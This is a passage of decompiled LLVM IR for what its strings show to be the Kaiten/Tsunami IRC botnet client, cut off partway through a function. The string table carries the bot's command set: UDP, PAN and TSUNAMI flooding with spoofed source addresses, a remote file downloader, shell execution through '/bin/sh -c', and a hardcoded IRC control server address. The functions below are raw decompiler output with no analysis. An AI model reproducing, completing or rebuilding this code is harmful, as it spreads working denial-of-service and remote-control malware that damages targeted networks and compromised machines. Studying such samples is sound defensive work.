source_filename = "test"
target datalayout = "e-m:e-p:32:32-f64:32:64-f80:32-n8:16:32-S128"

%rusage = type { %timeval, %timeval, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32 }
%timeval = type { i32, i32 }
%_TYPEDEF_sigset_t = type { [1 x i32] }
%timespec = type { i32, i32 }
%sigcontext = type { i32 }
%sigaction = type { void (i32)*, i32, void ()*, %_TYPEDEF_sigset_t }
%pollfd = type { i32, i16, i16 }

@df = internal unnamed_addr global i1 false
@eax = internal unnamed_addr global i32 0
@ecx = internal unnamed_addr global i32 0
@edx = internal unnamed_addr global i32 0
@ebx = internal unnamed_addr global i32 0
@esp = internal unnamed_addr global i32 0
@ebp = internal unnamed_addr global i32 0
@esi = internal unnamed_addr global i32 0
@edi = internal unnamed_addr global i32 0
@0 = external global i32
@global_var_8055cf4.2 = global i32 0
@global_var_8055d24.3 = local_unnamed_addr global i32* @global_var_8055cf4.2
@global_var_80588a8.7 = local_unnamed_addr global i32 0
@global_var_80524f0.8 = constant [30 x i8] c"NOTICE %s :Unable to comply.\0A\00"
@global_var_80560f0.9 = local_unnamed_addr global i32 0
@global_var_80589cc.10 = local_unnamed_addr global i32 0
@global_var_805250e.13 = constant i32 1966014578
@global_var_8052510.14 = constant [16 x i8] c"/usr/dict/words\00"
@global_var_8052520.16 = constant [25 x i8] c"%s : USERID : UNIX : %s\0A\00"
@global_var_805253c.17 = constant [33 x i8] c"NOTICE %s :GET <host> <save as>\0A\00"
@global_var_8052560.18 = constant [37 x i8] c"NOTICE %s :Unable to create socket.\0A\00"
@global_var_8052585.19 = constant [8 x i8] c"http://\00"
@global_var_8052590.20 = constant [39 x i8] c"NOTICE %s :Unable to resolve address.\0A\00"
@global_var_80525b8.21 = constant [39 x i8] c"NOTICE %s :Unable to connect to http.\0A\00"
@global_var_80525e0.22 = constant [276 x i8] c"GET /%s HTTP/1.0\0D\0AConnection: Keep-Alive\0D\0AUser-Agent: Mozilla/4.75 [en] (X11; U; Linux 2.2.16-3 i686)\0D\0AHost: %s:80\0D\0AAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*\0D\0AAccept-Encoding: gzip\0D\0AAccept-Language: en\0D\0AAccept-Charset: iso-8859-1,*,utf-8\0D\0A\0D\0A\00"
@global_var_80526f4.23 = constant [28 x i8] c"NOTICE %s :Receiving file.\0A\00"
@global_var_8052710.24 = constant [3 x i8] c"wb\00"
@global_var_8052713.25 = constant [5 x i8] c"\0D\0A\0D\0A\00"
@global_var_8052718.26 = constant [24 x i8] c"NOTICE %s :Saved as %s\0A\00"
@global_var_8052730.27 = constant [32 x i8] c"NOTICE %s :Spoofs: %d.%d.%d.%d\0A\00"
@global_var_8052750.28 = constant [46 x i8] c"NOTICE %s :Spoofs: %d.%d.%d.%d - %d.%d.%d.%d\0A\00"
@global_var_805277e.29 = constant [29 x i8] c"NOTICE %s :Kaiten wa goraku\0A\00"
@global_var_805279b.30 = constant [24 x i8] c"NOTICE %s :NICK <nick>\0A\00"
@global_var_80527b4.31 = constant [53 x i8] c"NOTICE %s :Nick cannot be larger than 9 characters.\0A\00"
@global_var_80527e9.32 = constant [9 x i8] c"NICK %s\0A\00"
@global_var_80527f2.33 = constant [27 x i8] c"NOTICE %s :DISABLE <pass>\0A\00"
@global_var_8052834.36 = constant [35 x i8] c"NOTICE %s :Current status is: %s.\0A\00"
@global_var_8052857.37 = constant [30 x i8] c"NOTICE %s :Already disabled.\0A\00"
@global_var_8052878.38 = constant [37 x i8] c"NOTICE %s :Password too long! > 254\0A\00"
@global_var_80587a0.39 = global i32 0
@global_var_80528a0.40 = constant [31 x i8] c"NOTICE %s :Disable sucessful.\0A\00"
@global_var_80528bf.41 = constant [26 x i8] c"NOTICE %s :ENABLE <pass>\0A\00"
@global_var_80528d9.42 = constant [29 x i8] c"NOTICE %s :Already enabled.\0A\00"
@global_var_80528f6.43 = constant [27 x i8] c"NOTICE %s :Wrong password\0A\00"
@global_var_8052911.44 = constant [30 x i8] c"NOTICE %s :Password correct.\0A\00"
@global_var_8052930.45 = constant [31 x i8] c"NOTICE %s :Removed all spoofs\0A\00"
@global_var_8052950.46 = constant [75 x i8] c"NOTICE %s :What kind of subnet address is that? Do something like: 169.40\0A\00"
@global_var_8056500.47 = global i32 0
@global_var_805299c.48 = constant [33 x i8] c"NOTICE %s :Unable to resolve %s\0A\00"
@global_var_80529c0.49 = constant [39 x i8] c"NOTICE %s :UDP <target> <port> <secs>\0A\00"
@global_var_80529e7.50 = constant [26 x i8] c"NOTICE %s :Packeting %s.\0A\00"
@global_var_8052a20.51 = constant i32 2
@global_var_8052a70.52 = constant [39 x i8] c"NOTICE %s :PAN <target> <port> <secs>\0A\00"
@global_var_8052a97.53 = constant [24 x i8] c"NOTICE %s :Panning %s.\0A\00"
@global_var_8052ab0.54 = constant [36 x i8] c"NOTICE %s :TSUNAMI <target> <secs>\0A\00"
@global_var_8052ad4.55 = constant [36 x i8] c"NOTICE %s :Tsunami heading for %s.\0A\00"
@global_var_80589c0.59 = local_unnamed_addr global i32 0
@global_var_80560e0.60 = local_unnamed_addr global i32 0
@global_var_80589c8.79 = local_unnamed_addr global i32 0
@global_var_80588a4.80 = local_unnamed_addr global i32 0
@global_var_805328d.90 = constant [13 x i8] c"MODE %s -xi\0A\00"
@global_var_80589c4.91 = local_unnamed_addr global i32 0
@global_var_805329a.92 = constant [13 x i8] c"JOIN %s :%s\0A\00"
@global_var_80532a7.93 = constant [8 x i8] c"WHO %s\0A\00"
@global_var_80532af.94 = constant [9 x i8] c"PONG %s\0A\00"
@global_var_80532b8.95 = constant [93 x i8] c"NOTICE %s :I'm having a problem resolving my host, someone will have to SPOOFS me manually.\0A\00"
@global_var_80524e0.100 = constant [16 x i8] c"212.109.222.122\00"
@global_var_8055d44.101 = global [16 x i8]* @global_var_80524e0.100
@global_var_8058750.102 = local_unnamed_addr global i32 0
@global_var_8055e80.104 = global i32 288
@global_var_8055ed0.105 = local_unnamed_addr global i32 272
@global_var_8058760.107 = global i32 0
@global_var_8055e58.108 = global i32 0
@global_var_8056520.109 = local_unnamed_addr global i32 0
@global_var_8056524.110 = local_unnamed_addr global i32 0
@global_var_8056504.111 = global i32 0
@global_var_805651c.112 = local_unnamed_addr global i32 0
@global_var_80536a0.113 = constant [3 x i8] c"-c\00"
@global_var_80536a8.114 = constant [3 x i8] c"sh\00"
@global_var_80536a3.115 = constant [8 x i8] c"/bin/sh\00"
@global_var_8055e70.116 = local_unnamed_addr global i32 2
@global_var_8055e40.117 = global i32 0
@global_var_8055e3c.118 = global i32* @global_var_8055e80.104
@global_var_80536ac.119 = constant i32 0
@global_var_80536c4.120 = constant [6 x i8] c"(nil)\00"
@global_var_80536ca.121 = constant [7 x i8] c"(null)\00"
@global_var_80536d1.122 = constant i32 2949163
@global_var_805373e.124 = constant i32 327688
@global_var_8056080 = external local_unnamed_addr global i32
@global_var_8054980.126 = constant i32 65536
@global_var_8053736.127 = constant [8 x i8] c" +0-#'I\00"
@global_var_80536e4.128 = constant [9 x i8] c"hlLjztqZ\00"
@global_var_8053721.129 = constant [21 x i8] c"npxXoudifFeEgGaACScs\00"
@global_var_8053717.130 = constant i32 117506048
@global_var_8053708.131 = constant i32 331776
@global_var_8053780.132 = constant [8 x i8] c"Success\00"
@global_var_8053762.133 = constant [15 x i8] c"Unknown error \00"
@global_var_8056088.134 = local_unnamed_addr global i32* @global_var_8054980.126
@global_var_8058560.135 = global i32 0
@global_var_805872c.136 = global i32 0
@global_var_8056090.137 = global i32 0
@global_var_8058d74.138 = local_unnamed_addr global i32 0
@global_var_8058d68.139 = global i32 0
@global_var_8055f70.140 = global i32 0
@global_var_8058a0c.142 = global i32 0
@global_var_8058a10.143 = local_unnamed_addr global i32 0
@global_var_8058a14.144 = global i32 0
@global_var_8058a20.145 = local_unnamed_addr global i32 0
@global_var_8058d14.146 = global i32 0
@global_var_8058d3c.147 = local_unnamed_addr global i32 0
@global_var_8058d2c.148 = local_unnamed_addr global i32 0
@global_var_8058d30.149 = local_unnamed_addr global i32 0
@global_var_8058d34.150 = local_unnamed_addr global i32 0
@global_var_8058d38.151 = local_unnamed_addr global i32 0
@global_var_8058d44.152 = local_unnamed_addr global i32 0
@global_var_8058d50.153 = local_unnamed_addr global i32 0
@global_var_8058d48.154 = local_unnamed_addr global i32 0
@global_var_8058d54.155 = local_unnamed_addr global i32 0
@global_var_8058d28.156 = local_unnamed_addr global i32 0
@global_var_8058d24.158 = local_unnamed_addr global i32 0
@global_var_8058d4c.159 = local_unnamed_addr global i32 0
@global_var_8058a1c.160 = local_unnamed_addr global i32 0
@global_var_8055f88.161 = global i32 0
@global_var_8055fa0.163 = global i32 0
@global_var_8055fb8 = external global i32
@global_var_8055fe4.165 = global i32 -1726662223
@global_var_8055fc0.166 = local_unnamed_addr global i32* @global_var_8055fe4.165
@global_var_8055fbc.167 = global i32* @global_var_8055fe4.165
@global_var_80542f4.168 = constant i32 0
@global_var_80542e0.169 = constant i32 0
@global_var_8056060.170 = global i32 0
@global_var_8058744.171 = local_unnamed_addr global i32 0
@global_var_805874c.172 = local_unnamed_addr global i32 0
@global_var_8055ce8.174 = global i32 -1
@global_var_804f287.175 = constant i32 -294069
@global_var_8058754.176 = local_unnamed_addr global i32 0
@global_var_8058758.177 = local_unnamed_addr global i32 0
@global_var_8054560.178 = constant [10 x i8] c"/dev/null\00"
@global_var_8058748.180 = local_unnamed_addr global i32 0
@global_var_804f46d.182 = constant i32 1928542531
@global_var_804f491.183 = constant i32 1928542531
@global_var_8058784.184 = local_unnamed_addr global i32 0
@global_var_8058764.185 = global i32 0
@global_var_8054b90.187 = constant [4 x i8] c"inf\00"
@global_var_8054b93.192 = constant i32 1179535616
@global_var_8054ba0.193 = constant i32 2883630
@global_var_8058768.194 = global i32 0
@global_var_8058d78.197 = local_unnamed_addr global i32 0
@global_var_8054c5c.198 = constant i32 1697579054
@global_var_8054c90.199 = constant i32 1868824690
@global_var_8054c5e.200 = constant [17 x i8] c"/etc/resolv.conf\00"
@global_var_8054c6f.201 = constant [24 x i8] c"/etc/config/resolv.conf\00"
@global_var_8054c87.202 = constant [11 x i8] c"nameserver\00"
@global_var_8054c92.203 = constant [7 x i8] c"domain\00"
@global_var_8054c99.204 = constant [7 x i8] c"search\00"
@global_var_8058d58.205 = global i32 0
@global_var_8058d7c.206 = local_unnamed_addr global i32 0
@global_var_8058d80.207 = local_unnamed_addr global i32 0
@global_var_8054cb4.208 = constant [17 x i8] c"0123456789abcdef\00"
@global_var_8054cb1.210 = constant [3 x i8] c"%x\00"
@global_var_8054cc5.211 = constant [11 x i8] c"/etc/hosts\00"
@global_var_8054cd0.212 = constant [18 x i8] c"/etc/config/hosts\00"
@global_var_80560c0.1 = local_unnamed_addr global i8 0
@global_var_8056100.5 = external global i8*
@global_var_80560e4.6 = local_unnamed_addr global i8 0
@global_var_80560e8.11 = external global i8*
@global_var_80560ec.12 = local_unnamed_addr global i64 0
@global_var_80560eb.96 = external local_unnamed_addr global i8*
@global_var_80560ea.97 = external local_unnamed_addr global i8*
@global_var_80560e9.98 = external global i8*
@global_var_8055d40.99 = local_unnamed_addr global i64 577908671678251009
@global_var_8053756.123 = external constant i8*
@global_var_80589e0.141 = global i8 0
@global_var_8058d40.157 = local_unnamed_addr global i8 0
@global_var_8058740.162 = local_unnamed_addr global i8 0
@global_var_805875c.179 = local_unnamed_addr global i8 0
@global_var_8058780.195 = local_unnamed_addr global i64 0
@global_var_805608c.196 = local_unnamed_addr global i16 1

declare void @__pseudo_call(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @function_8048094() local_unnamed_addr {
entry:
  %v0_8048097 = load i32, i32* @ebx, align 4
  %v1_8048098 = call i32 @function_80480b0(i32 %v0_8048097)
  %v0_804809d = load i32, i32* @ebx, align 4
  %v1_804809d = add i32 %v0_804809d, 56415
  store i32 %v1_804809d, i32* @ebx, align 4
  %v0_80480a3 = call i32 @function_8048110()
  %v0_80480a8 = call i32 @function_8052490()
  ret i32 %v0_80480a8
}

define i32 @function_80480b0(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @ebx, align 4
  %v0_80480b3 = load i32, i32* @eax, align 4
  ret i32 %v0_80480b3
}

define i32 @function_80480c0() local_unnamed_addr {
dec_label_pc_80480c0:
  %v0_80480c6 = load i8, i8* @global_var_80560c0.1, align 64
  %v1_80480c6 = icmp eq i8 %v0_80480c6, 0
  br i1 %v1_80480c6, label %dec_label_pc_80480db.preheader, label %dec_label_pc_80480c0.dec_label_pc_8048106_crit_edge

dec_label_pc_80480c0.dec_label_pc_8048106_crit_edge: ; preds = %dec_label_pc_80480c0
  %v0_8048107.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8048106

dec_label_pc_80480db.preheader:                   ; preds = %dec_label_pc_80480c0
  %v0_80480db1 = load i32, i32* bitcast (i32** @global_var_8055d24.3 to i32*), align 4
  %v1_80480e22 = icmp eq i32 %v0_80480db1, 0
  %v1_80480e49 = icmp eq i1 %v1_80480e22, false
  br i1 %v1_80480e49, label %dec_label_pc_80480d1.lr.ph, label %dec_label_pc_80480e6

dec_label_pc_80480d1.lr.ph:                       ; preds = %dec_label_pc_80480db.preheader
  br label %dec_label_pc_80480d1

dec_label_pc_80480d1:                             ; preds = %dec_label_pc_80480d1.lr.ph, %dec_label_pc_80480d1
  %v0_80480d1 = phi i32 [ %v0_80480db1, %dec_label_pc_80480d1.lr.ph ], [ %v0_80480db, %dec_label_pc_80480d1 ]
  %v1_80480d1 = add i32 %v0_80480d1, 4
  store i32 %v1_80480d1, i32* bitcast (i32** @global_var_8055d24.3 to i32*), align 4
  call void @__pseudo_call(i32 %v0_80480d1)
  %v0_80480db = load i32, i32* bitcast (i32** @global_var_8055d24.3 to i32*), align 4
  %v1_80480e2 = icmp eq i32 %v0_80480db, 0
  %v1_80480e4 = icmp eq i1 %v1_80480e2, false
  br i1 %v1_80480e4, label %dec_label_pc_80480d1, label %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge

dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge: ; preds = %dec_label_pc_80480d1
  br label %dec_label_pc_80480e6

dec_label_pc_80480e6:                             ; preds = %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge, %dec_label_pc_80480db.preheader
  store i8 1, i8* @global_var_80560c0.1, align 64
  br label %dec_label_pc_8048106

dec_label_pc_8048106:                             ; preds = %dec_label_pc_80480c0.dec_label_pc_8048106_crit_edge, %dec_label_pc_80480e6
  %v0_8048107 = phi i32 [ %v0_8048107.pre, %dec_label_pc_80480c0.dec_label_pc_8048106_crit_edge ], [ 0, %dec_label_pc_80480e6 ]
  ret i32 %v0_8048107

; uselistorder directives
  uselistorder i32 %v0_80480db, { 1, 0 }
  uselistorder i32 %v0_80480d1, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_8055d24.3 to i32*), { 1, 2, 0 }
  uselistorder i8* @global_var_80560c0.1, { 1, 0 }
  uselistorder label %dec_label_pc_8048106, { 1, 0 }
  uselistorder label %dec_label_pc_80480d1, { 1, 0 }
}

define i32 @function_8048110() local_unnamed_addr {
dec_label_pc_8048110:
  %stack_var_-4 = alloca i32, align 4
  %v0_8048110 = load i32, i32* @ebp, align 4
  store i32 %v0_8048110, i32* %stack_var_-4, align 4
  %v4_8048110 = ptrtoint i32* %stack_var_-4 to i32
  store i32 0, i32* @eax, align 4
  store i32 %v4_8048110, i32* @ebp, align 4
  %v0_804811b = call i32 @function_8048120()
  ret i32 %v0_804811b

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @function_8048120() local_unnamed_addr {
dec_label_pc_8048120:
  %v0_8048127 = load i32, i32* @eax, align 4
  %v1_8048127 = icmp eq i32 %v0_8048127, 0
  br i1 %v1_8048127, label %dec_label_pc_8048140, label %dec_label_pc_804812b

dec_label_pc_804812b:                             ; preds = %dec_label_pc_8048120
  %v1_8048138 = call i32 @unknown_0(i32 134565092)
  br label %dec_label_pc_8048140

dec_label_pc_8048140:                             ; preds = %dec_label_pc_8048120, %dec_label_pc_804812b
  %v0_8048140 = load i32, i32* inttoptr (i32 134569208 to i32*), align 8
  %v1_8048145 = icmp eq i32 %v0_8048140, 0
  br i1 %v1_8048145, label %dec_label_pc_804815f, label %dec_label_pc_8048149

dec_label_pc_8048149:                             ; preds = %dec_label_pc_8048140
  br label %dec_label_pc_804815f

dec_label_pc_804815f:                             ; preds = %dec_label_pc_8048149, %dec_label_pc_8048140
  ret i32 0

; uselistorder directives
  uselistorder label %dec_label_pc_8048140, { 1, 0 }
}

define i32 @entry_point(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  store i32 %arg1, i32* @esi, align 4
  %v0_804816c = load i32, i32* @eax, align 4
  store i32 %v0_804816c, i32* %stack_var_-4, align 4
  %v4_804816c = ptrtoint i32* %stack_var_-4 to i32
  %v0_804816e = load i32, i32* @edx, align 4
  %v9_8048180 = call i32 @function_804f323(i32 134524309, i32 %arg1, i32* nonnull %stack_var_4, i32 134512788, i32 134554808, i32 %v0_804816e, i32 %v4_804816c, i32 %v0_804816c)
  ret i32 %v9_8048180

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @function_8048188(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8048188:
  %tmp14 = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i32, align 4
  %v0_804818b = load i32, i32* @ebx, align 4
  store i32 %v0_804818b, i32* %stack_var_-8, align 4
  %v4_804818f = ptrtoint i8* %arg1 to i32
  %v2_8048192 = load i8, i8* %arg1, align 1
  %v12_804819a = icmp eq i8 %v2_8048192, 42
  br i1 %v12_804819a, label %dec_label_pc_80481c1, label %dec_label_pc_80481a0

dec_label_pc_80481a0:                             ; preds = %dec_label_pc_8048188
  %v12_80481a0 = icmp eq i8 %v2_8048192, 63
  br i1 %v12_80481a0, label %dec_label_pc_8048213, label %dec_label_pc_80481a6

dec_label_pc_80481a6:                             ; preds = %dec_label_pc_80481a0
  %v4_80481a6 = icmp eq i8 %v2_8048192, 0
  br i1 %v4_80481a6, label %dec_label_pc_80481b1, label %dec_label_pc_804824d

dec_label_pc_80481b1:                             ; preds = %dec_label_pc_80481a6
  %v2_80481b4 = load i8, i8* %tmp14, align 1
  %v2_80481b6 = sext i8 %v2_80481b4 to i32
  br label %dec_label_pc_80482aa

dec_label_pc_80481c1:                             ; preds = %dec_label_pc_8048188
  %v1_80481c4 = add i32 %v4_804818f, 1
  %v5_80481cb = inttoptr i32 %v1_80481c4 to i8*
  %v5_80481cc = call i32 @function_8048188(i8* %v5_80481cb, i32 %arg2)
  %v1_80481d4 = icmp eq i32 %v5_80481cc, 0
  br i1 %v1_80481d4, label %dec_label_pc_8048201, label %dec_label_pc_80481d8

dec_label_pc_80481d8:                             ; preds = %dec_label_pc_80481c1
  %v2_80481db = load i8, i8* %tmp14, align 1
  %v4_80481dd = icmp eq i8 %v2_80481db, 0
  br i1 %v4_80481dd, label %dec_label_pc_8048208, label %dec_label_pc_80481e1

dec_label_pc_80481e1:                             ; preds = %dec_label_pc_80481d8
  %v1_80481e4 = add i32 %arg2, 1
  %v5_80481ec = call i32 @function_8048188(i8* nonnull %arg1, i32 %v1_80481e4)
  %v1_80481f4 = icmp eq i32 %v5_80481ec, 0
  br i1 %v1_80481f4, label %dec_label_pc_8048201, label %dec_label_pc_8048208

dec_label_pc_8048201:                             ; preds = %dec_label_pc_80481e1, %dec_label_pc_80481c1
  br label %dec_label_pc_8048208

dec_label_pc_8048208:                             ; preds = %dec_label_pc_80481d8, %dec_label_pc_80481e1, %dec_label_pc_8048201
  %storemerge8 = phi i32 [ 0, %dec_label_pc_8048201 ], [ 1, %dec_label_pc_80481e1 ], [ 1, %dec_label_pc_80481d8 ]
  br label %dec_label_pc_80482aa

dec_label_pc_8048213:                             ; preds = %dec_label_pc_80481a0
  %v2_8048216 = load i8, i8* %tmp14, align 1
  %v4_8048218 = icmp eq i8 %v2_8048216, 0
  br i1 %v4_8048218, label %dec_label_pc_8048245, label %dec_label_pc_804821c

dec_label_pc_804821c:                             ; preds = %dec_label_pc_8048213
  %v1_804821f = add i32 %arg2, 1
  %v1_8048223 = add i32 %v4_804818f, 1
  %v5_8048228 = inttoptr i32 %v1_8048223 to i8*
  %v5_8048229 = call i32 @function_8048188(i8* %v5_8048228, i32 %v1_804821f)
  %v1_8048231 = icmp ne i32 %v5_8048229, 0
  %. = zext i1 %v1_8048231 to i32
  br label %dec_label_pc_8048245

dec_label_pc_8048245:                             ; preds = %dec_label_pc_804821c, %dec_label_pc_8048213
  %storemerge5 = phi i32 [ 1, %dec_label_pc_8048213 ], [ %., %dec_label_pc_804821c ]
  br label %dec_label_pc_80482aa

dec_label_pc_804824d:                             ; preds = %dec_label_pc_80481a6
  %v2_8048250 = load i8, i8* %arg1, align 1
  %v2_8048252 = sext i8 %v2_8048250 to i32
  %v2_8048259 = call i32 @function_804b754(i32 %v2_8048252)
  store i32 %v2_8048259, i32* @ebx, align 4
  %v2_8048266 = load i8, i8* %tmp14, align 1
  %v2_8048268 = sext i8 %v2_8048266 to i32
  %v2_804826f = call i32 @function_804b754(i32 %v2_8048268)
  %v0_8048277 = load i32, i32* @ebx, align 4
  %v12_8048277 = icmp eq i32 %v0_8048277, %v2_804826f
  %v1_8048279 = icmp eq i1 %v12_8048277, false
  br i1 %v1_8048279, label %dec_label_pc_80482a4, label %dec_label_pc_804827b

dec_label_pc_804827b:                             ; preds = %dec_label_pc_804824d
  %v1_804827e = add i32 %arg2, 1
  %v1_8048282 = add i32 %v4_804818f, 1
  %v5_8048287 = inttoptr i32 %v1_8048282 to i8*
  %v5_8048288 = call i32 @function_8048188(i8* %v5_8048287, i32 %v1_804827e)
  %v1_8048290 = icmp ne i32 %v5_8048288, 0
  %.9 = zext i1 %v1_8048290 to i32
  br label %dec_label_pc_80482a4

dec_label_pc_80482a4:                             ; preds = %dec_label_pc_804827b, %dec_label_pc_804824d
  %storemerge = phi i32 [ 1, %dec_label_pc_804824d ], [ %.9, %dec_label_pc_804827b ]
  br label %dec_label_pc_80482aa

dec_label_pc_80482aa:                             ; preds = %dec_label_pc_8048245, %dec_label_pc_8048208, %dec_label_pc_80481b1, %dec_label_pc_80482a4
  %stack_var_-24.0 = phi i32 [ %storemerge8, %dec_label_pc_8048208 ], [ %storemerge5, %dec_label_pc_8048245 ], [ %v2_80481b6, %dec_label_pc_80481b1 ], [ %storemerge, %dec_label_pc_80482a4 ]
  %v3_80482ad = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_80482ad, i32* @ebx, align 4
  ret i32 %stack_var_-24.0

; uselistorder directives
  uselistorder i8 %v2_8048192, { 2, 0, 1 }
  uselistorder i32 %v4_804818f, { 0, 2, 1 }
  uselistorder i8* %tmp14, { 3, 1, 0, 2 }
  uselistorder i32 (i32)* @function_804b754, { 1, 0 }
  uselistorder i32 %arg2, { 0, 3, 2, 1, 4 }
  uselistorder i8* %arg1, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_80482aa, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8048208, { 2, 1, 0 }
}

define i32 @function_80482b2(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_80482b2:
  %stack_var_12 = alloca i32, align 4
  %v0_80482b5 = load i32, i32* @edi, align 4
  %v4_80482bc = ptrtoint i32* %stack_var_12 to i32
  %v5_80482ce = call i32 @function_804b8a0(i32 ptrtoint (i8** @global_var_8056100.5 to i32), i32 %arg2, i32 %v4_80482bc)
  store i1 false, i1* @df, align 1
  store i32 ptrtoint (i8** @global_var_8056100.5 to i32), i32* @edi, align 4
  %v3_80482e9 = call i32 @_strlen(i8* bitcast (i8** @global_var_8056100.5 to i8*))
  %v6_80482fc = call i32 @function_804b71c(i32 %arg1, i32* bitcast (i8** @global_var_8056100.5 to i32*), i32 %v3_80482e9)
  store i32 %v0_80482b5, i32* @edi, align 4
  ret i32 %v6_80482fc
}

define i32 @function_8048309(i32 %arg1) local_unnamed_addr {
dec_label_pc_8048309:
  %v0_804830f = load i8, i8* @global_var_80560e4.6, align 4
  %v10_8048314 = icmp eq i8 %v0_804830f, 1
  %v1_8048316 = icmp eq i1 %v10_8048314, false
  br i1 %v1_8048316, label %dec_label_pc_804833d, label %dec_label_pc_8048318

dec_label_pc_8048318:                             ; preds = %dec_label_pc_8048309
  %v0_8048318 = load i32, i32* @global_var_80588a8.7, align 8
  %v3_8048329 = call i32 @function_80482b2(i32 %v0_8048318, i32 ptrtoint ([30 x i8]* @global_var_80524f0.8 to i32))
  br label %dec_label_pc_80483e3

dec_label_pc_804833d:                             ; preds = %dec_label_pc_8048309
  %v0_804833d = call i32 @function_804b4d4()
  %v4_8048345 = icmp eq i32 %v0_804833d, 0
  %v1_8048349 = icmp eq i1 %v4_8048345, false
  br i1 %v1_8048349, label %dec_label_pc_8048356, label %dec_label_pc_804834b

dec_label_pc_804834b:                             ; preds = %dec_label_pc_804833d
  br label %dec_label_pc_80483e3

dec_label_pc_8048356:                             ; preds = %dec_label_pc_804833d
  %v0_8048356 = load i32, i32* @global_var_80560f0.9, align 16
  %v1_804835b = add i32 %v0_8048356, 1
  store i32 %v1_804835b, i32* @global_var_80560f0.9, align 16
  %v2_8048366 = mul i32 %v1_804835b, 4
  %v1_8048369 = add i32 %v2_8048366, 4
  %v1_8048370 = call i32 @function_804da52(i32 %v1_8048369)
  %v0_80483a613 = load i32, i32* @global_var_80560f0.9, align 16
  %v6_80483af15 = icmp eq i32 %v0_80483a613, 1
  br i1 %v6_80483af15, label %dec_label_pc_80483b1, label %dec_label_pc_8048384

dec_label_pc_8048384:                             ; preds = %dec_label_pc_8048356, %dec_label_pc_8048384
  %storemerge16 = phi i32 [ %v4_80483a3, %dec_label_pc_8048384 ], [ 0, %dec_label_pc_8048356 ]
  %v2_8048387 = mul i32 %storemerge16, 4
  %v5_804838c = add i32 %v2_8048387, %v1_8048370
  %v0_8048397 = load i32, i32* @global_var_80589cc.10, align 4
  %v2_804839c = add i32 %v0_8048397, %v2_8048387
  %v1_804839f = inttoptr i32 %v2_804839c to i32*
  %v2_804839f = load i32, i32* %v1_804839f, align 4
  %v2_80483a1 = inttoptr i32 %v5_804838c to i32*
  store i32 %v2_804839f, i32* %v2_80483a1, align 4
  %v4_80483a3 = add i32 %storemerge16, 1
  %v0_80483a6 = load i32, i32* @global_var_80560f0.9, align 16
  %v1_80483ab = add i32 %v0_80483a6, -1
  %v6_80483af = icmp ugt i32 %v1_80483ab, %v4_80483a3
  br i1 %v6_80483af, label %dec_label_pc_8048384, label %dec_label_pc_80483b1

dec_label_pc_80483b1:                             ; preds = %dec_label_pc_8048384, %dec_label_pc_8048356
  %v0_80483a6.lcssa = phi i32 [ %v0_80483a613, %dec_label_pc_8048356 ], [ %v0_80483a6, %dec_label_pc_8048384 ]
  %v2_80483b6 = mul i32 %v0_80483a6.lcssa, 4
  %v5_80483b9 = add i32 %v1_8048370, -4
  %v1_80483bc = add i32 %v5_80483b9, %v2_80483b6
  %v2_80483c2 = inttoptr i32 %v1_80483bc to i32*
  store i32 %v0_804833d, i32* %v2_80483c2, align 4
  %v0_80483c4 = load i32, i32* @global_var_80589cc.10, align 4
  %v1_80483cd = call i32 @function_804e725(i32 %v0_80483c4)
  store i32 %v1_8048370, i32* @global_var_80589cc.10, align 4
  br label %dec_label_pc_80483e3

dec_label_pc_80483e3:                             ; preds = %dec_label_pc_804834b, %dec_label_pc_8048318, %dec_label_pc_80483b1
  %stack_var_-24.0 = phi i32 [ %v0_804833d, %dec_label_pc_80483b1 ], [ %v0_804833d, %dec_label_pc_804834b ], [ 1, %dec_label_pc_8048318 ]
  ret i32 %stack_var_-24.0

; uselistorder directives
  uselistorder i32 %v4_80483a3, { 1, 0 }
  uselistorder i32 %v2_8048387, { 1, 0 }
  uselistorder i32 %storemerge16, { 1, 0 }
  uselistorder i32 %v0_80483a613, { 1, 0 }
  uselistorder i32 %v1_8048370, { 2, 0, 1 }
  uselistorder i32* @global_var_80560f0.9, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_80483e3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8048384, { 1, 0 }
}

define i32 @function_80483e8() local_unnamed_addr {
dec_label_pc_80483e8:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %v0_80483e8 = load i32, i32* @ebp, align 4
  %v0_80483ee = load i8*, i8** @global_var_80560e8.11, align 4
  %v1_80483ee = ptrtoint i8* %v0_80483ee to i32
  store i32 %v1_80483ee, i32* @eax, align 4
  %v2_80483f3 = icmp eq i8* %v0_80483ee, null
  %v1_80483f5 = icmp eq i1 %v2_80483f3, false
  br i1 %v1_80483f5, label %dec_label_pc_8048401, label %dec_label_pc_80483f7

dec_label_pc_80483f7:                             ; preds = %dec_label_pc_80483e8
  %v1_80483f7 = call i32 @function_804e9f8(i32 %v0_80483e8)
  br label %dec_label_pc_8048452

dec_label_pc_8048401:                             ; preds = %dec_label_pc_80483e8
  %v0_8048401 = load i64, i64* @global_var_80560ec.12, align 8
  %v1_8048401 = trunc i64 %v0_8048401 to i32
  store i32 %v1_8048401, i32* @eax, align 4
  %v9_8048406 = icmp eq i32 %v1_8048401, 1
  %v1_8048409 = icmp eq i1 %v9_8048406, false
  br i1 %v1_8048409, label %dec_label_pc_8048421, label %dec_label_pc_804840b

dec_label_pc_804840b:                             ; preds = %dec_label_pc_8048401
